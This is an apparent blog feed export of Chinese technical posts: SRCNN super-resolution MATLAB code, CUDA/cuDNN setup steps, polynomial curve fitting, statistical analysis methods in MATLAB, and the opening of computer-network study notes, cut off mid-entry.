=> {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灰度图超分辨率重建</title>
      <link href="/2019/11/03/%E7%81%B0%E5%BA%A6%E5%9B%BE%E8%B6%85%E5%88%86%E8%BE%A8%E7%8E%87%E9%87%8D%E5%BB%BA/"/>
      <url>/2019/11/03/%E7%81%B0%E5%BA%A6%E5%9B%BE%E8%B6%85%E5%88%86%E8%BE%A8%E7%8E%87%E9%87%8D%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>超分辨率重建的开山之作</p><a id="more"></a><p><a href="http://mmlab.ie.cuhk.edu.hk/projects/SRCNN/SRCNN_v1.zip" target="_blank" rel="noopener">下载matlab版完整代码</a><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/%E8%B6%85%E5%88%86%E8%BE%A8-figure1.png" srcset="/img/loading.gif" lazyload="" alt="效果图"> </p><div class="hljs code-wrapper"><pre><code class="hljs matlab">close all;clear all;<span class="hljs-comment">%% 读取真实图像</span>im  = imread(<span class="hljs-string">'Set5\butterfly_GT.bmp'</span>);<span class="hljs-comment">%im  = imread('Set14\zebra.bmp');</span><span class="hljs-comment">%% 设定参数</span>up_scale = <span class="hljs-number">3</span>;model = <span class="hljs-string">'model\x3.mat'</span>;<span class="hljs-comment">% up_scale = 2;</span><span class="hljs-comment">% model = 'model\x2.mat'; </span><span class="hljs-comment">% up_scale = 4;</span><span class="hljs-comment">% model = 'model\x4.mat';</span><span class="hljs-comment">%% 仅在照度方面工作</span><span class="hljs-keyword">if</span> <span class="hljs-built_in">size</span>(im,<span class="hljs-number">3</span>)&gt;<span class="hljs-number">1</span>    im = rgb2ycbcr(im);    im = im(:, :, <span class="hljs-number">1</span>);<span class="hljs-keyword">end</span>im_gnd = modcrop(im, up_scale);im_gnd = double(im_gnd)/<span class="hljs-number">255</span>;<span class="hljs-comment">%single 这里换成double Matlab 7.0就可以运行了</span><span class="hljs-comment">%% 双三次插值</span>im_l = imresize(im_gnd, <span class="hljs-number">1</span>/up_scale, <span class="hljs-string">'bicubic'</span>); <span class="hljs-comment">%缩小</span>im_b = imresize(im_l, up_scale, <span class="hljs-string">'bicubic'</span>);<span class="hljs-comment">%再放大</span><span class="hljs-comment">%% SRCNN</span>im_h = SRCNN(model, im_b);<span class="hljs-comment">%% 删除边框</span>im_h = shave(uint8(im_h * <span class="hljs-number">255</span>), [up_scale, up_scale]);im_gnd = shave(uint8(im_gnd * <span class="hljs-number">255</span>), [up_scale, up_scale]);im_b = shave(uint8(im_b * <span class="hljs-number">255</span>), [up_scale, up_scale]);<span class="hljs-comment">%% 计算 PSNR</span>psnr_bic = compute_psnr(im_gnd,im_b);psnr_srcnn = compute_psnr(im_gnd,im_h);<span class="hljs-comment">%% 显示结果</span>fprintf(<span class="hljs-string">'双三次插值的峰值信噪比: %f dB\n'</span>, psnr_bic);fprintf(<span class="hljs-string">'SRCNN 重建的峰值信噪比: %f dB\n'</span>, psnr_srcnn);<span class="hljs-built_in">figure</span>, imshow(im_b); title(<span class="hljs-string">'双三次插值'</span>);<span class="hljs-built_in">figure</span>, imshow(im_h); title(<span class="hljs-string">'SRCNN 重建'</span>);imwrite(im_b, [<span class="hljs-string">'双三次插值'</span> <span class="hljs-string">'.bmp'</span>]);imwrite(im_h, [<span class="hljs-string">'SRCNN 重建'</span> <span class="hljs-string">'.bmp'</span>]);</code></pre></div><p><a href="http://mmlab.ie.cuhk.edu.hk/projects/SRCNN.html" target="_blank" rel="noopener">官方地址</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图像处理 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习框架GPU版前期准备（避坑指南）</title>
      <link href="/2019/10/26/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6GPU%E7%89%88%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%EF%BC%88%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%89/"/>
      <url>/2019/10/26/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6GPU%E7%89%88%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%EF%BC%88%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>大坑</p><a id="more"></a><h3 id="深度学习框架安装：前期准备"><a href="#深度学习框架安装：前期准备" class="headerlink" title="深度学习框架安装：前期准备"></a>深度学习框架安装：前期准备</h3><p>前情提要：相信安装过Pytorch、TensorFlow等框架的GPU版的人都知道，相比CPU版本安装，GPU版本的安装多么麻烦。但是，深度学习没GPU又不行啊（单纯靠CPU太慢了），故在此整理了教程上较为稀少的GPU版安装的前期准备，CUDA和CUDNN安装搞定了，剩下都问题不大啦！</p><h4 id="1-下载cuda和cudnn"><a href="#1-下载cuda和cudnn" class="headerlink" title="1.  下载cuda和cudnn"></a>1.  下载cuda和cudnn</h4><p> 下载cudn之前先查看电脑显卡支持的最高版本：<br> 控制面板-硬件和声音-NVIDIA面板-帮助-系统信息<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025195852431.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br> 例如此处则支持10.1.168版本的cuda</p><p>在此我下载cudnn9.0<br>cdunn官网下载：<a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">https://developer.nvidia.com/cuda-toolkit-archive</a><br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200201528.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>选择适合电脑操作系统的版本，Windows和MAC OSX提供network和local两种版本下载，<strong>建议local</strong>（network版在安装中容易出错）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200311349.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025201549771.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>安装完成之后等待检测<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025204744530.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>也可以选择自定义安装，但请记住安装的位置</p><h4 id="2-CUDNN下载"><a href="#2-CUDNN下载" class="headerlink" title="2. CUDNN下载"></a>2. CUDNN下载</h4><p>cudnn下载官网：<a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="noopener">https://developer.nvidia.com/rdp/cudnn-download</a>（注：cudnn下载需要注册登录NVIDIA）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200722785.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>下载与cuda对应的cudnn版本<br>将下载得到的cudnn解压包解压，别将cuda/include、cuda/lib、cuda/bin三个目录中的内容拷贝到C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0对应的include、lib、bin目录下即可。<br>![在这里插入图片描述](<a href="https://img-blog.csdnimg.cn/20191025205954318.pngcudnn安装" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/20191025205954318.pngcudnn安装</a><br> cudnn不需要安装，解压出来之后有个cudn的文件夹，打开，里面有四个文件<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025210047587.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>将其复制到安装CUDA的位置<br>使用精简（推荐）安装则在以下位置：<br>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0</p><p>（v9.0是版本号，如果是其他版本则对应其他版本的文件夹名称）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025210211626.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"></p><h4 id="3-安装Anconada"><a href="#3-安装Anconada" class="headerlink" title="3.  安装Anconada"></a>3.  安装Anconada</h4><p>官网下载：<a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">https://www.anaconda.com/distribution/</a></p><p> 注意选择与操作系统匹配的版本<img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025194017560.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br> <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025194513642.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>按照软件一般安装套路安装，但是建议添加环境变量这一步打上gou（否则得自己手动配置环境变量）<br>PS：勾选之后字体会变红色警告，不用管</p><ol start="2"><li>下载安装完成进入anoconda Prompt<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025193754912.png" srcset="/img/loading.gif" lazyload="" alt="在这里插入图片描述"><br>嗯，前期准备到此结束（CUDN和CUDNN以及anoconda安装）<br><a href="https://blog.csdn.net/kan2281123066/article/details/93789303" target="_blank" rel="noopener">pytorch安装</a></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>曲线拟合</title>
      <link href="/2019/09/20/%E6%9B%B2%E7%BA%BF%E6%8B%9F%E5%90%88/"/>
      <url>/2019/09/20/%E6%9B%B2%E7%BA%BF%E6%8B%9F%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>很古老的拟合方法了</p><a id="more"></a><p>当遇到需要用函数表达自变量及因变量的关系时，往往会遇到许多不能直观地看出类似的函数关系式的情况，例如该组自变量和因变量:</p><ul><li><p>x</p><p>(1:1:10)</p></li><li><p>y</p><p>13 15 57 15 12 16 15 18 98 44 11</p></li></ul><p>PS:表格处的(0:1:10)是matlab的一种写法，表示从0到10以1为间距（步长），即0，1，2……10</p><p>将图像用plot函数画出即下图：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6/20190920124407573.png" srcset="/img/loading.gif" lazyload="" alt="xy&quot;曲线&quot;图（数据用得太少了）"><br>这。。。谁看得出来呀，显然不可能是简单的y=ax+b吧<br>所以接下来会用到polyfit这个函数</p><h4 id="polyfit函数：示例"><a href="#polyfit函数：示例" class="headerlink" title="polyfit函数：示例"></a>polyfit函数：示例</h4><div class="hljs code-wrapper"><pre><code class="hljs matlab">x=(<span class="hljs-number">0</span>:<span class="hljs-number">1</span>:<span class="hljs-number">10</span>);y=x.*x+<span class="hljs-number">2</span>;<span class="hljs-built_in">plot</span>(x,y)p=polyfit(x,y,<span class="hljs-number">3</span>)  <span class="hljs-comment">%polyfit(x,y,3)中的3为多项式最高次幂，在这里意为最高是3</span></code></pre></div><p>得到结果：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/%E6%95%B0%E6%8D%AE%E7%A7%91%E5%AD%A6/img1fe53f8f6cff405a69960785e4564ab.png" srcset="/img/loading.gif" lazyload="" alt="计算结果"></p><p>即得到函数y= - 0.2422 x^3^ + 3.5845 x^2^ -11.2024 x + 25.7133</p><p>在这里是设置成多项式最高次数为3，因为polyfit函数其数学基础是最小二乘法曲线拟合原理。曲线拟合：已知离散点上的数据集，即已知在点集上的函数值，构造一个解析函数（其图形为一曲线）使在原离散点上尽可能接近给定的值，所以<strong>无论设置多项式次数为多少，理论上得到的结果都是正确的</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模常用的分析法MATLAB实现</title>
      <link href="/2019/09/20/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%B3%95%E5%8F%8A%E5%85%B6MATLAB%E5%AE%9E%E7%8E%B0/"/>
      <url>/2019/09/20/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%B3%95%E5%8F%8A%E5%85%B6MATLAB%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>主成分分析，层次分析,聚类分析,因子分析的简单介绍以及在MATLAB（2018a）上使用的简单介绍 ( 附源码 )</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本篇分别有主成分分析，层次分析,聚类分析,因子分析的简单介绍以及在MATLAB（2018a）上使用的简单介绍 ( 附源码 )</p><h1 id="主成分分析"><a href="#主成分分析" class="headerlink" title="主成分分析"></a>主成分分析</h1><p><a href="https://baike.baidu.com/item/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/829840?fr=aladdin" target="_blank" rel="noopener">主成分分析-百度百科</a><br>简单讲:主成分分析就是取出几个较少的变量尽可能多地反映原来变量的信息<br>(只看主要对结果有影的几个变量)<br>主成分分析适用于数学建模中筛选出少量变量对结果造成主要影响并用函数关系表征的情况</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%% 主成分分析 (降维)</span>clc, clearload example_1.txt  <span class="hljs-comment">%数据导入（数据要求：前几列为自变量，最后一列为因变量）</span>data = example_1;[m, n] = <span class="hljs-built_in">size</span>(data); num = <span class="hljs-number">3</span>;   <span class="hljs-comment">% 选取的主成分的个数</span>mu = <span class="hljs-built_in">mean</span>(data); sigma = std(data);  <span class="hljs-comment">%标准差</span><span class="hljs-comment">%z-score标准化方法适用于属性A的最大值和最小值未知的情况，或有超出取值范围的离群数据的情况</span><span class="hljs-comment">%标准化的新数据=（原数据-均值）/标准差</span>std_data = zscore(data);b = std_data(: , <span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>);     <span class="hljs-comment">% 四个变量x1, x2, x3, x4</span>r = cov(b);                                <span class="hljs-comment">% 变量的协方差矩阵</span><span class="hljs-comment">% 运用协方差矩阵进行PCA</span>[PC, latent, explained] = pcacov(r);  <span class="hljs-comment">%返回主成分(PC)、协方差矩阵X的特征值 (latent)和每个特征向量表征在观测量总方差中所占的百分数(explained)</span><span class="hljs-comment">% 新的主成分z1 = PC(1,1)*x1 + PC(2,1)*x2 + PC(3,1)*x3 + PC(4,1)*x4  , z2 = ...</span>f = <span class="hljs-built_in">repmat</span>(<span class="hljs-built_in">sign</span>(sum(PC)), <span class="hljs-built_in">size</span>(PC, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);            <span class="hljs-comment">%sum(PC)表示对矩阵PC的列求和</span>PC = PC .* f;<span class="hljs-comment">%1.普通的最小二乘法回归</span>regress_args_b = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>), b] \ std_data(:, <span class="hljs-keyword">end</span>);   <span class="hljs-comment">%标准化数据的回归方程系数</span>bzh = mu ./ sigma;<span class="hljs-comment">% 原始数据的常数项</span>ch10 = mu(<span class="hljs-keyword">end</span>) - bzh(<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * regress_args_b(<span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>) * sigma(<span class="hljs-keyword">end</span>);fr_1 = regress_args_b(<span class="hljs-number">2</span>:<span class="hljs-keyword">end</span>); fr_1 = fr_1';<span class="hljs-comment">% 原始数据的自变量的系数</span>ch1 = fr_1 ./ sigma(<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * sigma(<span class="hljs-keyword">end</span>);<span class="hljs-comment">% 此时模型为 y = ch10 + ch1[1]*x1 + ch1[2] * x2 + ch1[3] * x3 + ch1[4] * x4</span><span class="hljs-comment">% 计算均方误差</span>check1 = <span class="hljs-built_in">sqrt</span>(sum( (data(:, <span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * ch1' + ch10 - data(:, <span class="hljs-keyword">end</span>)) .^<span class="hljs-number">2</span> ) / (m - n))<span class="hljs-comment">%2.主成分回归模型</span>pca_val = b * PC(:, <span class="hljs-number">1</span>:num);<span class="hljs-comment">%主成分数据的回归方程系数</span>regress_args_pca = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>), pca_val] \ std_data(:, <span class="hljs-keyword">end</span>);<span class="hljs-built_in">beta</span> = PC(:, <span class="hljs-number">1</span>:num) * regress_args_pca(<span class="hljs-number">2</span>:num+<span class="hljs-number">1</span>);   <span class="hljs-comment">%标准化数据的回归方程系数</span><span class="hljs-comment">% 原始数据的常数项</span>ch20 = mu(<span class="hljs-keyword">end</span>) - bzh(<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * <span class="hljs-built_in">beta</span> * sigma(<span class="hljs-keyword">end</span>);fr_2 = beta';<span class="hljs-comment">% 原始数据的自变量的系数</span>ch2 = fr_2 ./ sigma(<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * sigma(<span class="hljs-keyword">end</span>);<span class="hljs-comment">% 此时模型为 y = ch20 + ch2[1]*x1 + ch2[2] * x2 + ch2[3] * x3 + ch2[4] * x4</span><span class="hljs-comment">% 计算均方误差</span>check2 = <span class="hljs-built_in">sqrt</span>(sum( (data(:, <span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) * ch2' + ch20 - data(:, <span class="hljs-keyword">end</span>)) .^<span class="hljs-number">2</span> ) / (m - num - <span class="hljs-number">1</span>))</code></pre></div><h1 id="层次分析"><a href="#层次分析" class="headerlink" title="层次分析"></a>层次分析</h1><p><a href="https://baike.baidu.com/item/%E5%B1%82%E6%AC%A1%E5%88%86%E6%9E%90/10986776?fr=aladdin" target="_blank" rel="noopener">层次分析-百度百科</a><br>简单讲：就是自己将两两影响因素作重要性对比得出判断矩阵，然后得出各个影响因素的权重<br>层次分析适用于数学建模多个变量对结果不同影响程度并用函数关系表征的情况</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%层次分析法（AHP)</span><span class="hljs-built_in">disp</span>(<span class="hljs-string">'请输入判断矩阵A（n阶）'</span>);A = input(<span class="hljs-string">'A='</span>);[n,n] = <span class="hljs-built_in">size</span>(A);x = <span class="hljs-built_in">ones</span>(n,<span class="hljs-number">100</span>);y = <span class="hljs-built_in">ones</span>(n,<span class="hljs-number">100</span>);m = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>);m(<span class="hljs-number">1</span>) = <span class="hljs-built_in">max</span>(x(:,<span class="hljs-number">1</span>));y(:,<span class="hljs-number">1</span>) = x(:,<span class="hljs-number">1</span>);x(:,<span class="hljs-number">2</span>) = A*y(:,<span class="hljs-number">1</span>);m(<span class="hljs-number">2</span>) = <span class="hljs-built_in">max</span>(x(:,<span class="hljs-number">2</span>));y(:,<span class="hljs-number">2</span>) = x(:,<span class="hljs-number">2</span>)/m(<span class="hljs-number">2</span>);p=<span class="hljs-number">0.0001</span>; <span class="hljs-built_in">i</span>=<span class="hljs-number">2</span>; k=<span class="hljs-built_in">abs</span>(m(<span class="hljs-number">2</span>)-m(<span class="hljs-number">1</span>));<span class="hljs-keyword">while</span> k&gt;p    <span class="hljs-built_in">i</span>=<span class="hljs-built_in">i</span>+<span class="hljs-number">1</span>;    x(:,<span class="hljs-built_in">i</span>) = A*y(:,<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>);    m(<span class="hljs-built_in">i</span>) = <span class="hljs-built_in">max</span>(x(:,<span class="hljs-built_in">i</span>));    y(:,<span class="hljs-built_in">i</span>) = x(:,<span class="hljs-built_in">i</span>)/m(<span class="hljs-built_in">i</span>);    k=<span class="hljs-built_in">abs</span>(m(<span class="hljs-built_in">i</span>)-m(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>));<span class="hljs-keyword">end</span>a = sum(y(:,<span class="hljs-built_in">i</span>));w = y(:,<span class="hljs-built_in">i</span>)/a;t = m(<span class="hljs-built_in">i</span>);<span class="hljs-built_in">disp</span>(w);<span class="hljs-comment">%一致性检验</span>CI = (t-n)/(n<span class="hljs-number">-1</span>);RI = [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.52</span> <span class="hljs-number">0.89</span> <span class="hljs-number">1.12</span> <span class="hljs-number">1.36</span> <span class="hljs-number">1.41</span> <span class="hljs-number">1.46</span> <span class="hljs-number">1.49</span> <span class="hljs-number">1.52</span> <span class="hljs-number">1.54</span> <span class="hljs-number">1.56</span> <span class="hljs-number">1.58</span> <span class="hljs-number">1.59</span>];CR = CI/RI(n);<span class="hljs-keyword">if</span> CR&lt;<span class="hljs-number">0.10</span>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">'此矩阵一致性可以接受！'</span>);    <span class="hljs-built_in">disp</span>(<span class="hljs-string">'CI='</span>);<span class="hljs-built_in">disp</span>(CI);    <span class="hljs-built_in">disp</span>(<span class="hljs-string">'CR='</span>);<span class="hljs-built_in">disp</span>(CR);<span class="hljs-keyword">end</span></code></pre></div><h1 id="聚类分析"><a href="#聚类分析" class="headerlink" title="聚类分析"></a>聚类分析</h1><p><a href="https://baike.baidu.com/item/%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/3450227?fr=aladdin" target="_blank" rel="noopener">聚类分析-百度百科</a><br>简单讲：就是多个影响因素按不同联系程度分类</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">%聚类分析X;   %X为导入数据的名称(类型：数值矩阵)X=X<span class="hljs-string">';    %将矩阵X转置，按情况看是否需要此语句</span><span class="hljs-string">Y=pdist(X);     %X为要聚类的数组</span><span class="hljs-string">SF=squareform(Y);</span><span class="hljs-string">Z=linkage(Y,'</span>averag<span class="hljs-string">e');</span><span class="hljs-string">dendrogram(Z,0);</span><span class="hljs-string">T=cluster(Z,'</span>maxclust<span class="hljs-string">',3);</span></code></pre></div><h1 id="因子分析"><a href="#因子分析" class="headerlink" title="因子分析"></a>因子分析</h1><p><a href="https://baike.baidu.com/item/%E5%9B%A0%E5%AD%90%E5%88%86%E6%9E%90/91849" target="_blank" rel="noopener">因子分析-百度百科</a><br>可看作是主成分分析的推广，涉及的计算与主成分分析很类似</p><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">%因子分析</span>clc,clearload ssgs.txt   <span class="hljs-comment">%把原始数据保存在纯文本文件ssgs.txt中</span>n=<span class="hljs-built_in">size</span>(ssgs,<span class="hljs-number">1</span>);x=ssgs(:,[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]); y=ssgs(:,<span class="hljs-number">5</span>); <span class="hljs-comment">%分别提出自变量x1...x4和因变量x的值</span>x=zscore(x); <span class="hljs-comment">%数据标准化</span>r=corrcoef(x)  <span class="hljs-comment">%求相关系数矩阵</span>[vec1,val,con1]=pcacov(r)  <span class="hljs-comment">%进行主成分分析的相关计算</span>f1=<span class="hljs-built_in">repmat</span>(<span class="hljs-built_in">sign</span>(sum(vec1)),<span class="hljs-built_in">size</span>(vec1,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>);vec2=vec1.*f1;     <span class="hljs-comment">%特征向量正负号转换</span>f2=<span class="hljs-built_in">repmat</span>(<span class="hljs-built_in">sqrt</span>(val)',<span class="hljs-built_in">size</span>(vec2,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>); a=vec2.*f2   <span class="hljs-comment">%求初等载荷矩阵</span>num=input(<span class="hljs-string">'请选择主因子的个数：'</span>);  <span class="hljs-comment">%交互式选择主因子的个数</span>am=a(:,[<span class="hljs-number">1</span>:num]);  <span class="hljs-comment">%提出num个主因子的载荷矩阵</span>[bm,t]=rotatefactors(am,<span class="hljs-string">'method'</span>, <span class="hljs-string">'varimax'</span>) <span class="hljs-comment">%am旋转变换,bm为旋转后的载荷阵</span>bt=[bm,a(:,[num+<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span>])];  <span class="hljs-comment">%旋转后全部因子的载荷矩阵,前两个旋转，后面不旋转</span>con2=sum(bt.^<span class="hljs-number">2</span>)       <span class="hljs-comment">%计算因子贡献</span>check=[con1,con2'/sum(con2)*<span class="hljs-number">100</span>]<span class="hljs-comment">%该语句是领会旋转意义,con1是未旋转前的贡献率</span>rate=con2(<span class="hljs-number">1</span>:num)/sum(con2) <span class="hljs-comment">%计算因子贡献率</span>coef=inv(r)*bm          <span class="hljs-comment">%计算得分函数的系数</span>score=x*coef           <span class="hljs-comment">%计算各个因子的得分</span>weight=rate/sum(rate)  <span class="hljs-comment">%计算得分的权重</span>Tscore=score*weight'   <span class="hljs-comment">%对各因子的得分进行加权求和，即求各企业综合得分</span>[STscore,ind]=<span class="hljs-built_in">sort</span>(Tscore,<span class="hljs-string">'descend'</span>)      <span class="hljs-comment">%对企业进行排序</span>display=[score(ind,:)';STscore';ind'] <span class="hljs-comment">%显示排序结果</span>[ccoef,p]=corrcoef([Tscore,y])    <span class="hljs-comment">%计算F与资产负债的相关系数</span>[d,dt,e,et,stats]=regress(Tscore,[<span class="hljs-built_in">ones</span>(n,<span class="hljs-number">1</span>),y]);<span class="hljs-comment">%计算F与资产负债的方程</span>d,stats  <span class="hljs-comment">%显示回归系数，和相关统计量的值</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：计算机网络（断更）</title>
      <link href="/2019/09/16/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/09/16/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>计网经典教材+中国大学MOOC 哈工大版 </p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此笔记为学习教材《计算机网络》(第7版)-谢希仁以及中国大学MOOC 哈尔滨工业大学 李全龙老师的视频所记录的一些知识点</p><h2 id="1-1-计算机网络基本概念"><a href="#1-1-计算机网络基本概念" class="headerlink" title="1.1 计算机网络基本概念"></a>1.1 计算机网络基本概念</h2><h3 id="什么是计算机网络？"><a href="#什么是计算机网络？" class="headerlink" title="什么是计算机网络？"></a>什么是计算机网络？</h3><p>计算机网络=通信技术+计算机技术</p><ul><li>通信系统模型：</li></ul><div class="hljs code-wrapper"><pre class="mermaid">graph LRA[信源]--&gt;B[发送设备]B[发送设备]--&gt;C[信道]D[噪声源]--&gt;C[信道]C[信道]--&gt;E[接收设备]E[接收设备]--&gt;F[信宿]</pre></div><p>计算机网络就是一种通信网络</p><p>定义：计算机网络就是<strong>互连</strong>的、<strong>自治</strong>的计算机集合。</p><p>（互连：无主从关系     互联：通过通信链路完成互联互通）</p><p>主机距离远、数量大需要通过<strong>交换网络</strong>互连主机</p><p>交换网络中的<strong>交换节点</strong>：路由器或交换机</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705191419376.png" srcset="/img/loading.gif" lazyload="" width="30%"></center>  - Internet组成细节角度<div class="hljs code-wrapper"><pre><code>全球最大的互联网络 IPS网络互连的“网络之网络”计算设备集合：主机(hosts)=端系统(end 